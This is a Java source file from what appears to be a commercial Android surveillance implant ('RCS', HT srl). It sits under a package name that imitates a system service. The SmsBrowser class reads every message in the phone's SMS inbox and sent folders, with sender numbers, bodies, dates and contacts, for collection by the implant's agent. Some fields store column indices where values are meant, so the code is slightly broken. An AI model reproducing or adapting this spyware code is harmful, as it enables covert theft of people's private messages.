/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : SmsBrowser.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.agent.sms;

import java.util.ArrayList;

import android.database.Cursor;
import android.net.Uri;

import com.android.service.Sms;
import com.android.service.Status;
import com.android.service.auto.Cfg;
import com.android.service.util.Check;

public class SmsBrowser {
	private static final String TAG = "SmsBrowser";

	private final ArrayList<Sms> list;

	public SmsBrowser() {
		list = new ArrayList<Sms>();
	}

	public ArrayList<Sms> getSmsList() {
		list.clear();

		parse("content://sms/inbox", Sms.RECEIVED);
		parse("content://sms/sent", Sms.SENT);

		return list;
	}

	private void parse(String content, boolean sentState) {
		final Cursor c = Status.getAppContext().getContentResolver().query(Uri.parse(content), null, null, null, null);

		final int smsEntriesCount = c.getCount();

		if (c.moveToFirst() == false) {
			c.close();
			return;
		}

		for (int i = 0; i < smsEntriesCount; i++) {
			String body, number;
			long date;
			boolean sentStatus;

			// These fields are needed
			try {
				body = c.getString(c.getColumnIndexOrThrow("body")).toString();
				number = c.getString(c.getColumnIndexOrThrow("address")).toString();
				date = Long.parseLong(c.getString(c.getColumnIndexOrThrow("date")).toString());
				sentStatus = sentState;
			} catch (final Exception e) {
				if (Cfg.DEBUG) {
					Check.log(e);
				}
				c.close();
				return;
			}

			final Sms s = new Sms(number, body, date, sentStatus);

			// These fields are optional
			try {
				final int yields_id = c.getColumnIndexOrThrow("yields _id");
				s.setYieldsId(yields_id);
			} catch (final Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);
				}
			}

			try {
				final int thread_id = c.getColumnIndexOrThrow("thread_id");
				s.setThreadId(thread_id);
			} catch (final Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);
				}
			}

			try {
				final String person = c.getString(c.getColumnIndexOrThrow("person")).toString();
				s.setPerson(person);
			} catch (final Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);
				}
			}

			try {
				final int protocol = c.getColumnIndexOrThrow("protocol");
				s.setProtocol(protocol);
			} catch (final Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);
				}
			}

			try {
				final int read = c.getColumnIndexOrThrow("read");
				s.setRead(read);
			} catch (final Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);
				}
			}

			try {
				final int status = c.getColumnIndexOrThrow("status");
				s.setStatus(status);
			} catch (final Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);
				}
			}

			try {
				final int type = c.getColumnIndexOrThrow("type");
				s.setType(type);
			} catch (final Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);
				}
			}

			try {
				final int reply_path = c.getColumnIndexOrThrow("reply_path_present");
				s.setReplyPath(reply_path);
			} catch (final Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);
				}
			}

			/*
			 * try { String subject =
			 * c.getString(c.getColumnIndexOrThrow("subject")).toString();
			 * if(AutoConfig.DEBUG) Check.log( "subject: " + test); } catch
			 * (Exception e) { if(AutoConfig.DEBUG) { Check.log(e); } }
			 */

			try {
				final String service_center = c.getString(c.getColumnIndexOrThrow("service_center")).toString();
				s.setServiceCenter(service_center);
			} catch (final Exception e) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (parse): " + e);
				}
			}

			c.moveToNext();
			list.add(s);
		}
	}
}